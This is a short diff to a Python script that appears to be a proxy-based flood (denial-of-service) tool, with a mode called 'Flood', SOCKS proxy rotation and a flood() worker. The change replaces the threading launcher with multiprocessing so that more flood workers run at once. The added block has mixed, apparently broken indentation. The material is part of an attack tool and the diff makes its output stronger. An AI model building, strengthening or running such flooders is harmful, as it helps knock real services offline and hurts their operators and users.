@@ -1,6 +1,5 @@
 #!/usr/bin/python3
-import requests, string, socket, socks, time, random, threading, sys, datetime, argparse, os
-
+import requests, string, socket, socks, time, random, threading, sys, datetime, argparse, os, multiprocessing
 
 mode = "Flood"
 
@@ -30,17 +29,16 @@ args = parser.parse_args()
 printOption = "false"
 
 
-
-
-
 def build_threads(mode,thread_num,event,socks_type):
 	if mode == "Flood":
-		for _ in range(thread_num):
-			th = threading.Thread(target = flood,args=(event,socks_type,))
-			th.setDaemon(True)
-			th.start()
+		if __name__ == '__main__':
+    			processes = []
+    			for i in range(thread_num):
+	        		p = multiprocessing.Process(target = flood,args=(event,socks_type,))
+        			processes.append(p)
+        			p.start()
 
-
+			
 def flood(event,socks_type):
 	if (opcion == 2):
 		proxy = random.choice(proxies).strip().split(":")
